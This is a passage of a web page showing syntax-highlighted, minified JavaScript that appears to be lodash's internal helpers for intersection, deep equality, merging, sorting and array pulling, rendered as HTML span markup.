e <span class="keyword">in</span> <span class="title function_">pt</span>(t)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">yr</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> i = n ? fe : he, o = t[<span class="number">0</span>].<span class="property">length</span>, a = t.<span class="property">length</span>, c = a, s = <span class="title function_">r</span>(a), u = <span class="number">1</span> / <span class="number">0</span>, l = []; c--;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> h = t[c];</span><br><span class="line">                                    c &amp;&amp; e &amp;&amp; (h = <span class="title function_">de</span>(h, <span class="title class_">Ee</span>(e))),</span><br><span class="line">                                        u = <span class="title function_">sn</span>(h.<span class="property">length</span>, u),</span><br><span class="line">                                        s[c] = !n &amp;&amp; (e || o &gt;= <span class="number">120</span> &amp;&amp; h.<span class="property">length</span> &gt;= <span class="number">120</span>) ? <span class="keyword">new</span> <span class="title class_">Fn</span>(c &amp;&amp; h) : <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                h = t[<span class="number">0</span>];</span><br><span class="line">                                <span class="keyword">var</span> f = -<span class="number">1</span></span><br><span class="line">                                    , d = s[<span class="number">0</span>];</span><br><span class="line">                                <span class="attr">t</span>: <span class="keyword">for</span> (; ++f &lt; o &amp;&amp; l.<span class="property">length</span> &lt; u;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> p = h[f]</span><br><span class="line">                                        , v = e ? <span class="title function_">e</span>(p) : p;</span><br><span class="line">                                    <span class="keyword">if</span> (p = n || <span class="number">0</span> !== p ? p : <span class="number">0</span>,</span><br><span class="line">                                        !(d ? <span class="title class_">Le</span>(d, v) : <span class="title function_">i</span>(l, v, n))) &#123;</span><br><span class="line">                                        <span class="keyword">for</span> (c = a; --c;) &#123;</span><br><span class="line">                                            <span class="keyword">var</span> m = s[c];</span><br><span class="line">                                            <span class="keyword">if</span> (!(m ? <span class="title class_">Le</span>(m, v) : <span class="title function_">i</span>(t[c], v, n)))</span><br><span class="line">                                                <span class="keyword">continue</span> t</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        d &amp;&amp; d.<span class="title function_">push</span>(v),</span><br><span class="line">                                            l.<span class="title function_">push</span>(p)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> l</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">br</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> r = <span class="literal">null</span> == (t = <span class="title function_">go</span>(t, e = <span class="title function_">si</span>(e, t))) ? t : t[<span class="title class_">Ho</span>(<span class="title class_">Ro</span>(e))];</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span> == r ? <span class="keyword">void</span> <span class="number">0</span> : <span class="title function_">oe</span>(r, t, n)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">wr</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">qa</span>(t) &amp;&amp; <span class="title function_">pr</span>(t) == s</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">_r</span>(<span class="params">t, e, n, r, i</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> t === e || (<span class="literal">null</span> == t || <span class="literal">null</span> == e || !<span class="title function_">qa</span>(t) &amp;&amp; !<span class="title function_">qa</span>(e) ? t != t &amp;&amp; e != e : <span class="keyword">function</span> (<span class="params">t, e, n, r, i, o</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> a = <span class="title class_">Va</span>(t)</span><br><span class="line">                                        , c = <span class="title class_">Va</span>(e)</span><br><span class="line">                                        , d = a ? u : <span class="title function_">ro</span>(t)</span><br><span class="line">                                        , p = c ? u : <span class="title function_">ro</span>(e)</span><br><span class="line">                                        , x = (d = d == s ? g : d) == g</span><br><span class="line">                                        , S = (p = p == s ? g : p) == g</span><br><span class="line">                                        , C = d == p;</span><br><span class="line">                                    <span class="keyword">if</span> (C &amp;&amp; <span class="title class_">Da</span>(t)) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (!<span class="title class_">Da</span>(e))</span><br><span class="line">                                            <span class="keyword">return</span> !<span class="number">1</span>;</span><br><span class="line">                                        a = !<span class="number">0</span>,</span><br><span class="line">                                            x = !<span class="number">1</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">if</span> (C &amp;&amp; !x)</span><br><span class="line">                                        <span class="keyword">return</span> o || (o = <span class="keyword">new</span> <span class="title class_">Dn</span>),</span><br><span class="line">                                            a || <span class="title class_">Ka</span>(t) ? <span class="title class_">Ui</span>(t, e, n, r, i, o) : <span class="keyword">function</span> (<span class="params">t, e, n, r, i, o, a</span>) &#123;</span><br><span class="line">                                                <span class="keyword">switch</span> (n) &#123;</span><br><span class="line">                                                    <span class="keyword">case</span> <span class="attr">M</span>:</span><br><span class="line">                                                        <span class="keyword">if</span> (t.<span class="property">byteLength</span> != e.<span class="property">byteLength</span> || t.<span class="property">byteOffset</span> != e.<span class="property">byteOffset</span>)</span><br><span class="line">                                                            <span class="keyword">return</span> !<span class="number">1</span>;</span><br><span class="line">                                                        t = t.<span class="property">buffer</span>,</span><br><span class="line">                                                            e = e.<span class="property">buffer</span>;</span><br><span class="line">                                                    <span class="keyword">case</span> <span class="attr">z</span>:</span><br><span class="line">                                                        <span class="keyword">return</span> !(t.<span class="property">byteLength</span> != e.<span class="property">byteLength</span> || !<span class="title function_">o</span>(<span class="keyword">new</span> <span class="title class_">Vt</span>(t), <span class="keyword">new</span> <span class="title class_">Vt</span>(e)));</span><br><span class="line">                                                    <span class="keyword">case</span> <span class="attr">l</span>:</span><br><span class="line">                                                    <span class="keyword">case</span> <span class="attr">h</span>:</span><br><span class="line">                                                    <span class="keyword">case</span> <span class="attr">m</span>:</span><br><span class="line">                                                        <span class="keyword">return</span> <span class="title class_">Oa</span>(+t, +e);</span><br><span class="line">                                                    <span class="keyword">case</span> <span class="attr">f</span>:</span><br><span class="line">                                                        <span class="keyword">return</span> t.<span class="property">name</span> == e.<span class="property">name</span> &amp;&amp; t.<span class="property">message</span> == e.<span class="property">message</span>;</span><br><span class="line">                                                    <span class="keyword">case</span> <span class="attr">y</span>:</span><br><span class="line">                                                    <span class="keyword">case</span> <span class="attr">w</span>:</span><br><span class="line">                                                        <span class="keyword">return</span> t == e + <span class="string">&quot;&quot;</span>;</span><br><span class="line">                                                    <span class="keyword">case</span> <span class="attr">v</span>:</span><br><span class="line">                                                        <span class="keyword">var</span> c = <span class="title class_">Ie</span>;</span><br><span class="line">                                                    <span class="keyword">case</span> <span class="attr">b</span>:</span><br><span class="line">                                                        <span class="keyword">var</span> s = <span class="number">1</span> &amp; r;</span><br><span class="line">                                                        <span class="keyword">if</span> (c || (c = <span class="title class_">Ue</span>),</span><br><span class="line">                                                        t.<span class="property">size</span> != e.<span class="property">size</span> &amp;&amp; !s)</span><br><span class="line">                                                            <span class="keyword">return</span> !<span class="number">1</span>;</span><br><span class="line">                                                        <span class="keyword">var</span> u = a.<span class="title function_">get</span>(t);</span><br><span class="line">                                                        <span class="keyword">if</span> (u)</span><br><span class="line">                                                            <span class="keyword">return</span> u == e;</span><br><span class="line">                                                        r |= <span class="number">2</span>,</span><br><span class="line">                                                            a.<span class="title function_">set</span>(t, e);</span><br><span class="line">                                                        <span class="keyword">var</span> d = <span class="title class_">Ui</span>(<span class="title function_">c</span>(t), <span class="title function_">c</span>(e), r, i, o, a);</span><br><span class="line">                                                        <span class="keyword">return</span> a.<span class="title function_">delete</span>(t),</span><br><span class="line">                                                            d;</span><br><span class="line">                                                    <span class="keyword">case</span> <span class="attr">_</span>:</span><br><span class="line">                                                        <span class="keyword">if</span> (<span class="title class_">Hn</span>)</span><br><span class="line">                                                            <span class="keyword">return</span> <span class="title class_">Hn</span>.<span class="title function_">call</span>(t) == <span class="title class_">Hn</span>.<span class="title function_">call</span>(e)</span><br><span class="line">                                                &#125;</span><br><span class="line">                                                <span class="keyword">return</span> !<span class="number">1</span></span><br><span class="line">                                            &#125;(t, e, d, n, r, i, o);</span><br><span class="line">                                    <span class="keyword">if</span> (!(<span class="number">1</span> &amp; n)) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> H = x &amp;&amp; zt.<span class="title function_">call</span>(t, <span class="string">&quot;__wrapped__&quot;</span>)</span><br><span class="line">                                            , T = S &amp;&amp; zt.<span class="title function_">call</span>(e, <span class="string">&quot;__wrapped__&quot;</span>);</span><br><span class="line">                                        <span class="keyword">if</span> (H || T) &#123;</span><br><span class="line">                                            <span class="keyword">var</span> A = H ? t.<span class="title function_">value</span>() : t</span><br><span class="line">                                                , O = T ? e.<span class="title function_">value</span>() : e;</span><br><span class="line">                                            <span class="keyword">return</span> o || (o = <span class="keyword">new</span> <span class="title class_">Dn</span>),</span><br><span class="line">                                                <span class="title function_">i</span>(A, O, n, r, o)</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">if</span> (!C)</span><br><span class="line">                                        <span class="keyword">return</span> !<span class="number">1</span>;</span><br><span class="line">                                    <span class="keyword">return</span> o || (o = <span class="keyword">new</span> <span class="title class_">Dn</span>),</span><br><span class="line">                                        <span class="keyword">function</span> (<span class="params">t, e, n, r, i, o</span>) &#123;</span><br><span class="line">                                            <span class="keyword">var</span> a = <span class="number">1</span> &amp; n</span><br><span class="line">                                                , c = <span class="title class_">Yi</span>(t)</span><br><span class="line">                                                , s = c.<span class="property">length</span></span><br><span class="line">                                                , u = <span class="title class_">Yi</span>(e).<span class="property">length</span>;</span><br><span class="line">                                            <span class="keyword">if</span> (s != u &amp;&amp; !a)</span><br><span class="line">                                                <span class="keyword">return</span> !<span class="number">1</span>;</span><br><span class="line">                                            <span class="keyword">var</span> l = s;</span><br><span class="line">                                            <span class="keyword">for</span> (; l--;) &#123;</span><br><span class="line">                                                <span class="keyword">var</span> h = c[l];</span><br><span class="line">                                                <span class="keyword">if</span> (!(a ? h <span class="keyword">in</span> e : zt.<span class="title function_">call</span>(e, h)))</span><br><span class="line">                                                    <span class="keyword">return</span> !<span class="number">1</span></span><br><span class="line">                                            &#125;</span><br><span class="line">                                            <span class="keyword">var</span> f = o.<span class="title function_">get</span>(t)</span><br><span class="line">                                                , d = o.<span class="title function_">get</span>(e);</span><br><span class="line">                                            <span class="keyword">if</span> (f &amp;&amp; d)</span><br><span class="line">                                                <span class="keyword">return</span> f == e &amp;&amp; d == t;</span><br><span class="line">                                            <span class="keyword">var</span> p = !<span class="number">0</span>;</span><br><span class="line">                                            o.<span class="title function_">set</span>(t, e),</span><br><span class="line">                                                o.<span class="title function_">set</span>(e, t);</span><br><span class="line">                                            <span class="keyword">var</span> v = a;</span><br><span class="line">                                            <span class="keyword">for</span> (; ++l &lt; s;) &#123;</span><br><span class="line">                                                h = c[l];</span><br><span class="line">                                                <span class="keyword">var</span> m = t[h]</span><br><span class="line">                                                    , g = e[h];</span><br><span class="line">                                                <span class="keyword">if</span> (r)</span><br><span class="line">                                                    <span class="keyword">var</span> y = a ? <span class="title function_">r</span>(g, m, h, e, t, o) : <span class="title function_">r</span>(m, g, h, t, e, o);</span><br><span class="line">                                                <span class="keyword">if</span> (!(<span class="keyword">void</span> <span class="number">0</span> === y ? m === g || <span class="title function_">i</span>(m, g, n, r, o) : y)) &#123;</span><br><span class="line">                                                    p = !<span class="number">1</span>;</span><br><span class="line">                                                    <span class="keyword">break</span></span><br><span class="line">                                                &#125;</span><br><span class="line">                                                v || (v = <span class="string">&quot;constructor&quot;</span> == h)</span><br><span class="line">                                            &#125;</span><br><span class="line">                                            <span class="keyword">if</span> (p &amp;&amp; !v) &#123;</span><br><span class="line">                                                <span class="keyword">var</span> b = t.<span class="property">constructor</span></span><br><span class="line">                                                    , w = e.<span class="property">constructor</span>;</span><br><span class="line">                                                b == w || !(<span class="string">&quot;constructor&quot;</span> <span class="keyword">in</span> t) || !(<span class="string">&quot;constructor&quot;</span> <span class="keyword">in</span> e) || <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> b &amp;&amp; b <span class="keyword">instanceof</span> b &amp;&amp; <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> w &amp;&amp; w <span class="keyword">instanceof</span> w || (p = !<span class="number">1</span>)</span><br><span class="line">                                            &#125;</span><br><span class="line">                                            <span class="keyword">return</span> o.<span class="title function_">delete</span>(t),</span><br><span class="line">                                                o.<span class="title function_">delete</span>(e),</span><br><span class="line">                                                p</span><br><span class="line">                                        &#125;(t, e, n, r, i, o)</span><br><span class="line">                                &#125;(t, e, n, r, _r, i))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">xr</span>(<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> i = n.<span class="property">length</span></span><br><span class="line">                                    , o = i</span><br><span class="line">                                    , a = !r;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="literal">null</span> == t)</span><br><span class="line">                                    <span class="keyword">return</span> !o;</span><br><span class="line">                                <span class="keyword">for</span> (t = <span class="title function_">pt</span>(t); i--;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> c = n[i];</span><br><span class="line">                                    <span class="keyword">if</span> (a &amp;&amp; c[<span class="number">2</span>] ? c[<span class="number">1</span>] !== t[c[<span class="number">0</span>]] : !(c[<span class="number">0</span>] <span class="keyword">in</span> t))</span><br><span class="line">                                        <span class="keyword">return</span> !<span class="number">1</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">for</span> (; ++i &lt; o;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> s = (c = n[i])[<span class="number">0</span>]</span><br><span class="line">                                        , u = t[s]</span><br><span class="line">                                        , l = c[<span class="number">1</span>];</span><br><span class="line">                                    <span class="keyword">if</span> (a &amp;&amp; c[<span class="number">2</span>]) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> === u &amp;&amp; !(s <span class="keyword">in</span> t))</span><br><span class="line">                                            <span class="keyword">return</span> !<span class="number">1</span></span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="keyword">var</span> h = <span class="keyword">new</span> <span class="title class_">Dn</span>;</span><br><span class="line">                                        <span class="keyword">if</span> (r)</span><br><span class="line">                                            <span class="keyword">var</span> f = <span class="title function_">r</span>(u, l, s, t, e, h);</span><br><span class="line">                                        <span class="keyword">if</span> (!(<span class="keyword">void</span> <span class="number">0</span> === f ? <span class="title function_">_r</span>(l, u, <span class="number">3</span>, r, h) : f))</span><br><span class="line">                                            <span class="keyword">return</span> !<span class="number">1</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> !<span class="number">0</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">zr</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> !(!<span class="title class_">Ua</span>(t) || (e = t,</span><br><span class="line">                                <span class="title class_">St</span> &amp;&amp; <span class="title class_">St</span> <span class="keyword">in</span> e)) &amp;&amp; (<span class="title class_">Ia</span>(t) ? <span class="title class_">At</span> : at).<span class="title function_">test</span>(<span class="title class_">To</span>(t));</span><br><span class="line">                                <span class="keyword">var</span> e</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Mr</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> t ? t : <span class="literal">null</span> == t ? <span class="title class_">Wc</span> : <span class="string">&quot;object&quot;</span> == <span class="keyword">typeof</span> t ? <span class="title class_">Va</span>(t) ? <span class="title class_">Or</span>(t[<span class="number">0</span>], t[<span class="number">1</span>]) : <span class="title class_">Ar</span>(t) : <span class="title function_">ns</span>(t)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Sr</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (!<span class="title function_">fo</span>(t))</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">an</span>(t);</span><br><span class="line">                                <span class="keyword">var</span> e = [];</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> n <span class="keyword">in</span> <span class="title function_">pt</span>(t))</span><br><span class="line">                                    zt.<span class="title function_">call</span>(t, n) &amp;&amp; <span class="string">&quot;constructor&quot;</span> != n &amp;&amp; e.<span class="title function_">push</span>(n);</span><br><span class="line">                                <span class="keyword">return</span> e</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Cr</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (!<span class="title class_">Ua</span>(t))</span><br><span class="line">                                    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> e = [];</span><br><span class="line">                                        <span class="keyword">if</span> (<span class="literal">null</span> != t)</span><br><span class="line">                                            <span class="keyword">for</span> (<span class="keyword">var</span> n <span class="keyword">in</span> <span class="title function_">pt</span>(t))</span><br><span class="line">                                                e.<span class="title function_">push</span>(n);</span><br><span class="line">                                        <span class="keyword">return</span> e</span><br><span class="line">                                    &#125;(t);</span><br><span class="line">                                <span class="keyword">var</span> e = <span class="title function_">fo</span>(t)</span><br><span class="line">                                    , n = [];</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> r <span class="keyword">in</span> t)</span><br><span class="line">                                    (<span class="string">&quot;constructor&quot;</span> != r || !e &amp;&amp; zt.<span class="title function_">call</span>(t, r)) &amp;&amp; n.<span class="title function_">push</span>(r);</span><br><span class="line">                                <span class="keyword">return</span> n</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Hr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> t &lt; e</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Tr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> n = -<span class="number">1</span></span><br><span class="line">                                    , i = <span class="title function_">ja</span>(t) ? <span class="title function_">r</span>(t.<span class="property">length</span>) : [];</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">er</span>(t, (<span class="keyword">function</span> (<span class="params">t, r, o</span>) &#123;</span><br><span class="line">                                        i[++n] = <span class="title function_">e</span>(t, r, o)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                    i</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Ar</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> e = <span class="title class_">Ki</span>(t);</span><br><span class="line">                                <span class="keyword">return</span> <span class="number">1</span> == e.<span class="property">length</span> &amp;&amp; e[<span class="number">0</span>][<span class="number">2</span>] ? <span class="title function_">vo</span>(e[<span class="number">0</span>][<span class="number">0</span>], e[<span class="number">0</span>][<span class="number">1</span>]) : <span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> n === t || <span class="title function_">xr</span>(n, t, e)</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Or</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">uo</span>(t) &amp;&amp; <span class="title function_">po</span>(e) ? <span class="title function_">vo</span>(<span class="title class_">Ho</span>(t), e) : <span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> r = <span class="title function_">mc</span>(n, t);</span><br><span class="line">                                    <span class="keyword">return</span> <span class="keyword">void</span> <span class="number">0</span> === r &amp;&amp; r === e ? <span class="title function_">gc</span>(n, t) : <span class="title function_">_r</span>(e, r, <span class="number">3</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Er</span>(<span class="params">t, e, n, r, i</span>) &#123;</span><br><span class="line">                                t !== e &amp;&amp; <span class="title function_">cr</span>(e, (<span class="keyword">function</span> (<span class="params">o, a</span>) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (i || (i = <span class="keyword">new</span> <span class="title class_">Dn</span>),</span><br><span class="line">                                            <span class="title class_">Ua</span>(o))</span><br><span class="line">                                            !<span class="keyword">function</span> (<span class="params">t, e, n, r, i, o, a</span>) &#123;</span><br><span class="line">                                                <span class="keyword">var</span> c = <span class="title function_">bo</span>(t, n)</span><br><span class="line">                                                    , s = <span class="title function_">bo</span>(e, n)</span><br><span class="line">                                                    , u = a.<span class="title function_">get</span>(s);</span><br><span class="line">                                                <span class="keyword">if</span> (u)</span><br><span class="line">                                                    <span class="keyword">return</span> <span class="keyword">void</span> <span class="title class_">Bn</span>(t, n, u);</span><br><span class="line">                                                <span class="keyword">var</span> l = o ? <span class="title function_">o</span>(c, s, n + <span class="string">&quot;&quot;</span>, t, e, a) : <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                                                    , h = <span class="keyword">void</span> <span class="number">0</span> === l;</span><br><span class="line">                                                <span class="keyword">if</span> (h) &#123;</span><br><span class="line">                                                    <span class="keyword">var</span> f = <span class="title class_">Va</span>(s)</span><br><span class="line">                                                        , d = !f &amp;&amp; <span class="title class_">Da</span>(s)</span><br><span class="line">                                                        , p = !f &amp;&amp; !d &amp;&amp; <span class="title class_">Ka</span>(s);</span><br><span class="line">                                                    l = s,</span><br><span class="line">                                                        f || d || p ? <span class="title class_">Va</span>(c) ? l = c : <span class="title class_">Fa</span>(c) ? l = <span class="title function_">yi</span>(c) : d ? (h = !<span class="number">1</span>,</span><br><span class="line">                                                            l = <span class="title function_">fi</span>(s, !<span class="number">0</span>)) : p ? (h = !<span class="number">1</span>,</span><br><span class="line">                                                            l = <span class="title function_">pi</span>(s, !<span class="number">0</span>)) : l = [] : <span class="title class_">Xa</span>(s) || <span class="title class_">La</span>(s) ? (l = c,</span><br><span class="line">                                                            <span class="title class_">La</span>(c) ? l = <span class="title function_">cc</span>(c) : <span class="title class_">Ua</span>(c) &amp;&amp; !<span class="title class_">Ia</span>(c) || (l = <span class="title function_">oo</span>(s))) : h = !<span class="number">1</span></span><br><span class="line">                                                &#125;</span><br><span class="line">                                                h &amp;&amp; (a.<span class="title function_">set</span>(s, l),</span><br><span class="line">                                                    <span class="title function_">i</span>(l, s, r, o, a),</span><br><span class="line">                                                    a.<span class="title function_">delete</span>(s));</span><br><span class="line">                                                <span class="title class_">Bn</span>(t, n, l)</span><br><span class="line">                                            &#125;(t, e, a, n, <span class="title class_">Er</span>, r, i);</span><br><span class="line">                                        <span class="keyword">else</span> &#123;</span><br><span class="line">                                            <span class="keyword">var</span> c = r ? <span class="title function_">r</span>(<span class="title function_">bo</span>(t, a), o, a + <span class="string">&quot;&quot;</span>, t, e, i) : <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">                                            <span class="keyword">void</span> <span class="number">0</span> === c &amp;&amp; (c = o),</span><br><span class="line">                                                <span class="title class_">Bn</span>(t, a, c)</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                ), xc)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">kr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> n = t.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">if</span> (n)</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">co</span>(e += e &lt; <span class="number">0</span> ? n : <span class="number">0</span>, n) ? t[e] : <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Lr</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                e = e.<span class="property">length</span> ? <span class="title function_">de</span>(e, (<span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title class_">Va</span>(t) ? <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                                                <span class="keyword">return</span> <span class="title function_">fr</span>(e, <span class="number">1</span> === t.<span class="property">length</span> ? t[<span class="number">0</span>] : t)</span><br><span class="line">                                            &#125;</span><br><span class="line">                                            : t</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )) : [<span class="title class_">Wc</span>];</span><br><span class="line">                                <span class="keyword">var</span> r = -<span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">return</span> e = <span class="title function_">de</span>(e, <span class="title class_">Ee</span>(<span class="title class_">Qi</span>())),</span><br><span class="line">                                    <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> n = t.<span class="property">length</span>;</span><br><span class="line">                                        <span class="keyword">for</span> (t.<span class="title function_">sort</span>(e); n--;)</span><br><span class="line">                                            t[n] = t[n].<span class="property">value</span>;</span><br><span class="line">                                        <span class="keyword">return</span> t</span><br><span class="line">                                    &#125;(<span class="title class_">Tr</span>(t, (<span class="keyword">function</span> (<span class="params">t, n, i</span>) &#123;</span><br><span class="line">                                            <span class="keyword">return</span> &#123;</span><br><span class="line">                                                <span class="attr">criteria</span>: <span class="title function_">de</span>(e, (<span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                                                        <span class="keyword">return</span> <span class="title function_">e</span>(t)</span><br><span class="line">                                                    &#125;</span><br><span class="line">                                                )),</span><br><span class="line">                                                <span class="attr">index</span>: ++r,</span><br><span class="line">                                                <span class="attr">value</span>: t</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    )), (<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                            <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                                <span class="keyword">var</span> r = -<span class="number">1</span></span><br><span class="line">                                                    , i = t.<span class="property">criteria</span></span><br><span class="line">                                                    , o = e.<span class="property">criteria</span></span><br><span class="line">                                                    , a = i.<span class="property">length</span></span><br><span class="line">                                                    , c = n.<span class="property">length</span>;</span><br><span class="line">                                                <span class="keyword">for</span> (; ++r &lt; a;) &#123;</span><br><span class="line">                                                    <span class="keyword">var</span> s = <span class="title function_">vi</span>(i[r], o[r]);</span><br><span class="line">                                                    <span class="keyword">if</span> (s) &#123;</span><br><span class="line">                                                        <span class="keyword">if</span> (r &gt;= c)</span><br><span class="line">                                                            <span class="keyword">return</span> s;</span><br><span class="line">                                                        <span class="keyword">var</span> u = n[r];</span><br><span class="line">                                                        <span class="keyword">return</span> s * (<span class="string">&quot;desc&quot;</span> == u ? -<span class="number">1</span> : <span class="number">1</span>)</span><br><span class="line">                                                    &#125;</span><br><span class="line">                                                &#125;</span><br><span class="line">                                                <span class="keyword">return</span> t.<span class="property">index</span> - e.<span class="property">index</span></span><br><span class="line">                                            &#125;(t, e, n)</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    ))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Vr</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> r = -<span class="number">1</span>, i = e.<span class="property">length</span>, o = &#123;&#125;; ++r &lt; i;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> a = e[r]</span><br><span class="line">                                        , c = <span class="title function_">fr</span>(t, a);</span><br><span class="line">                                    <span class="title function_">n</span>(c, a) &amp;&amp; $r(o, <span class="title function_">si</span>(a, t), c)</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> o</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Pr</span>(<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> i = r ? xe : _e</span><br><span class="line">                                    , o = -<span class="number">1</span></span><br><span class="line">                                    , a = e.<span class="property">length</span></span><br><span class="line">                                    , c = t;</span><br><span class="line">                                <span class="keyword">for</span> (t === e &amp;&amp; (e = <span class="title function_">yi</span>(e)),</span><br><span class="line">                                     n &amp;&amp; (c = <span class="title function_">de</span>(t, <span class="title class_">Ee</span>(n))); ++o &lt; a;)</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="keyword">var</span> s = <span class="number">0</span>, u = e[o], l = n ? <span class="title function_">n</span>(u) : u; (s = <span class="title function_">i</span>(c, l, s, r)) &gt; -<span class="number">1</span>;)</span><br><span class="line">                                        c !== t &amp;&amp; <span class="title class_">Xt</span>.<span class="title function_">call</span>(c, s, <span class="number">1</span>),</span><br><span class="line">                                            <span class="title class_">Xt</span>.<span class="title function_">call</span>(t, s, <span class="number">1</span>);</span><br><span class="line">                                <span class="keyword">return</span> t</span><br><span class="line">                            